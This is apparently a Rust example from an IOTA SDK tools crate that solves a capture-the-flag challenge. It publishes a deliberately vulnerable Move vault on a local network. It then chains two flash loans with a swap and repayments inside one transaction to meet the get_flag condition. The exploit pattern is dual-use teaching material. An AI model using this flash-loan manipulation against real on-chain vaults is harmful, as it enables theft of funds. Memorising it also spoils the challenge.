// Copyright 2024 IOTA Stiftung
// SPDX-License-Identifier: Apache-2.0

use core::str::FromStr;

use anyhow::anyhow;
use iota_config::{iota_config_dir, IOTA_CLIENT_CONFIG};
use iota_sdk::{wallet_context::WalletContext, IotaClientBuilder, IOTA_LOCAL_NETWORK_URL};
use iota_sdk_tools::{
    client::{
        builders::ptb::{Mut, ProgrammableTransactionBuilder, Res},
        response::Published,
    },
    move_type,
    query::{Query, Queryable as _},
    Client, CustomMoveType,
};
use iota_types::base_types::IotaAddress;
use tracing_subscriber::{fmt::format::FmtSpan, prelude::*, EnvFilter};

move_type!(
    struct ctfa::CTFA;
);

move_type!(
    struct ctfb::CTFB;
);

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenvy::dotenv().ok();
    set_up_logging()?;

    let mut args = std::env::args().skip(1);
    let address = args.next();
    let network = args
        .next()
        .unwrap_or_else(|| IOTA_LOCAL_NETWORK_URL.to_owned());

    let config_path = iota_config_dir()?.join(IOTA_CLIENT_CONFIG);

    let (iota_client, active_address) = if config_path.exists() {
        let mut context = WalletContext::new(&config_path, None, None)?;

        (context.get_client().await?, context.active_address().ok())
    } else {
        (IotaClientBuilder::default().build(network).await?, None)
    };

    let address = match address {
        Some(a) => IotaAddress::from_str(&a)?,
        None => active_address.ok_or_else(|| anyhow!("no active or provided address found"))?,
    };

    let client = Client::new(iota_client, address)?;

    // Publish a module
    let (Published { package_id, .. }, txn) = client
        .publish("crates/iota-sdk-tools/examples/challenge_8")
        .execute()
        .await?;

    let mint_a = txn
        .created
        .first_matching(Query::new().type_name("MintA").shared())?
        .object_id;
    let mint_b = txn
        .created
        .first_matching(Query::new().type_name("MintB").shared())?
        .object_id;

    let txn = client
        .call_move(package_id, "vault", "initialize")
        .generics::<(CTFA, CTFB)>()
        .params((mint_a, mint_b))
        .execute()
        .await?;
    let vault = txn
        .created
        .first_matching(Query::new().type_name("Vault").shared())?;
    let coin_b = txn
        .created
        .first_matching(Query::new().coin(true).generics::<CTFB>(package_id))?
        .object_id;

    let txn = client.split_coin(coin_b, [1]).execute().await?;

    let coin_b = txn
        .created
        .first_matching(Query::new().coin(true).generics::<CTFB>(package_id))?;

    let mut builder = ProgrammableTransactionBuilder::new(&client);

    // Flash the vault
    builder
        .move_call(package_id, "vault", "flash")
        .generics::<(CTFA, CTFB)>()
        .params((Mut(vault.object_id), 99_u64, true))
        .finish(("flash_coin_a", "flash_coin_b", "receipt"))
        .await?;

    // Swap coin B to coin A
    builder
        .move_call(package_id, "vault", "swap_b_to_a")
        .generics::<(CTFA, CTFB)>()
        .params((Mut(vault.object_id), coin_b.object_id))
        .finish("coin_a")
        .await?;

    // Transfer coin A to self
    builder
        .transfer_objects(client.data().await.address, Res("coin_a"))
        .await?;

    // Repay the flash
    builder
        .move_call(package_id, "vault", "repay_flash")
        .generics::<(CTFA, CTFB)>()
        .params((
            Mut(vault.object_id),
            Res("flash_coin_a"),
            Res("flash_coin_b"),
            Res("receipt"),
        ))
        .finish(None)
        .await?;

    // Flash the vault again
    builder
        .move_call(package_id, "vault", "flash")
        .generics::<(CTFA, CTFB)>()
        .params((Mut(vault.object_id), 101_u64, true))
        .finish(("flash_coin_a_2", "flash_coin_b_2", "receipt_2"))
        .await?;

    // Get the flag
    builder
        .move_call(package_id, "vault", "get_flag")
        .generics::<(CTFA, CTFB)>()
        .params(Mut(vault.object_id))
        .finish(None)
        .await?;

    // Repay the flash
    builder
        .move_call(package_id, "vault", "repay_flash")
        .generics::<(CTFA, CTFB)>()
        .params((
            Mut(vault.object_id),
            Res("flash_coin_a_2"),
            Res("flash_coin_b_2"),
            Res("receipt_2"),
        ))
        .finish(None)
        .await?;

    // Execute the txn
    let digest = builder.execute().await?.digest;
    println!("Challenge 8: {digest:#?}");

    Ok(())
}

fn set_up_logging() -> anyhow::Result<()> {
    std::panic::set_hook(Box::new(|p| {
        tracing::error!("{}", p);
    }));

    let registry = tracing_subscriber::registry();

    let registry = {
        registry
            .with(EnvFilter::from_default_env())
            .with(tracing_subscriber::fmt::layer().with_span_events(FmtSpan::CLOSE))
    };

    registry.init();
    Ok(())
}
